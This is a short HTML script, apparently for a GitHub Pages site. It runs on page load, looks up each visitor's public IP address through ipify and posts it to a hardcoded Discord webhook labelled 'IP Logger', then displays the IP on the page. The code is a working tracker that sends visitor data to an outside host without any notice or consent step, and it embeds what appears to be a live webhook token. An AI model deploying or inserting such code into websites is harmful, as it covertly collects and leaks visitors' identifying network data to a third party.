<script>
window.addEventListener("load", async () => {
  // Only send once per session
  if (sessionStorage.getItem("visitLogged")) return;
  sessionStorage.setItem("visitLogged", "true");

  const webhookURL = "https://discord.com/api/webhooks/1472358587455246548/pc6oWJBb1vMP2bkfS-diW4OkkIY96FWF3RoCC3_3vaBRszSmWis70oIhupoAIcLsTNA6";

  try {
    // Fetch public IP
    const res = await fetch("https://api64.ipify.org?format=json");
    const data = await res.json();
    const ip = data.ip;

    // Create Discord embed payload
    const payload = {
      username: "IP Logger",
      embeds: [{
        title: "üåê New Visit Detected",
        color: 5814783,
        fields: [
          { name: "IP Address", value: ip }
        ],
        timestamp: new Date().toISOString()
      }]
    };

    await fetch(webhookURL, {
      method: "POST",
      mode: "no-cors", // required for GitHub Pages
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    document.body.insertAdjacentHTML(
      'beforeend',
      `<p style="color:green;">‚úÖ IP sent: ${ip}</p>`
    );

  } catch (err) {
    document.body.insertAdjacentHTML(
      'beforeend',
      `<p style="color:red;">‚ùå Error: ${err.message}</p>`
    );
  }
});
</script>
